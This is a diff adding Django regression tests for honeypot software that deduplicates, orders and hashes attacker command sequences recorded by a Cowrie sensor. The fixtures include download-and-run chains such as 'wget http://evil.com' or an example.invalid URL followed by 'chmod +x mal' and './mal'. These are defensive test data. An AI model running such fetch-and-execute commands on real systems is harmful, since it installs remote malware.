@@ -302,6 +302,11 @@ class TestProcessCommands(CustomTestCase):
         seq = CommandSequence.objects.first()
         self.assertEqual(seq.commands.count("whoami"), 1)
 
+    def test_whitespace_variant_commands_deduplicated(self):
+        _process_commands([self._hit("ls"), self._hit("ls "), self._hit(" ls")])
+        seq = CommandSequence.objects.first()
+        self.assertEqual(seq.commands, ["ls"])
+
     def test_command_order_preserved(self):
         cmds = ["cd /tmp", "wget http://evil.com", "chmod +x mal", "./mal"]
         _process_commands([self._hit(c) for c in cmds])
@@ -1202,3 +1207,54 @@ class TestBatchCompletionInvalidatesCache(CustomTestCase):
         self.batch.refresh_from_db()
         self.assertEqual(self.batch.status, "failed")
         self.assertEqual(self._version(), before)
+
+
+class TestCommandSequenceOrdering(CustomTestCase):
+    """End-to-end regression tests for chronological command ordering during event ingestion."""
+
+    ATTACKER = "193.32.162.45"
+
+    def setUp(self):
+        super().setUp()
+        CommandSequence.objects.all().delete()
+        self.user = make_user(username="cmd_order_user")
+        self.api_source = make_api_source(self.user, name="CmdOrderSource")
+        self.sensor = make_sensor(api_source=self.api_source, address="203.0.113.61", honeypot_software="Cowrie")
+
+    @patch(PATCH_UPDATE_SCORES)
+    def test_ordered_events_preserve_command_sequence_and_hash(self, mock_scores):
+        batch = make_batch(self.api_source, task_id="task-cmd-order")
+        cmds = ["cd /tmp", "wget http://example.invalid/mal", "chmod +x mal", "./mal"]
+        base = timezone.now() - timedelta(minutes=5)
+        for idx, cmd in enumerate(cmds):
+            make_raw_event(
+                batch,
+                self.sensor,
+                src_ip=self.ATTACKER,
+                command=cmd,
+                timestamp=base + timedelta(seconds=idx),
+            )
+
+        process_incoming_event(self.api_source.pk, batch.task_id)
+
+        batch.refresh_from_db()
+        self.assertEqual(batch.status, "completed")
+        seq = CommandSequence.objects.get()
+        self.assertEqual(seq.commands, cmds)
+        expected_hash = hashlib.sha256("\n".join(cmds).encode()).hexdigest()
+        self.assertEqual(seq.commands_hash, expected_hash)
+
+    @patch(PATCH_UPDATE_SCORES)
+    def test_events_ordered_by_timestamp_then_pk(self, mock_scores):
+        batch = make_batch(self.api_source, task_id="task-cmd-tiebreak")
+        t1 = timezone.now() - timedelta(minutes=5)
+        t2 = t1 + timedelta(seconds=10)
+        # Insert t2 first so pk order differs from timestamp order; t1 appears twice to test pk tie-breaker.
+        make_raw_event(batch, self.sensor, src_ip=self.ATTACKER, command="third", timestamp=t2)
+        make_raw_event(batch, self.sensor, src_ip=self.ATTACKER, command="first", timestamp=t1)
+        make_raw_event(batch, self.sensor, src_ip=self.ATTACKER, command="second", timestamp=t1)
+
+        process_incoming_event(self.api_source.pk, batch.task_id)
+
+        seq = CommandSequence.objects.get()
+        self.assertEqual(seq.commands, ["first", "second", "third"])
